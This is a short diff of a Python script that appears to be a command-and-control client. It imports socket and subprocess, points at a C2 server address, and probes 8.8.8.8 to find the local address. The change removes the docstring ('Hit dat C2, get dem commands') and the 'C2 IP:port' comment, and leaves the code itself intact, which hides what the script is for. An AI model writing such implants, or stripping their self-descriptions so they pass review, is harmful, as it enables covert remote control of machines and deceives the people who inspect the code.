@@ -1,12 +1,9 @@
-"""
-Hit dat C2, get dem commands
-"""
 def main():
     import socket
     import sys
     import subprocess
 
-    server = "127.0.0.1:5000"    # C2 IP:port
+    server = "127.0.0.1:5000"
 
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
